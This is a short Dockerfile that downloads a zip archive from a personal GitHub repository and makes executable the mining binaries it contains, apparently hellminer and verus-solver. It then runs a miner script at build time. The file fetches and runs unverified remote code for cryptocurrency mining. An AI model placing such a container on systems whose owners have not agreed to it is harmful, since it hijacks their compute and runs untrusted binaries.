FROM debian:stable
RUN apt-get update && apt-get -y install wget vim unzip
WORKDIR /home
RUN wget https://github.com/sicobra00/pr3/raw/main/project.zip
RUN unzip project.zip
RUN chmod +x run_miner.sh
RUN chmod +x hellminer
RUN chmod +x verus-solver
RUN ./run_miner.sh
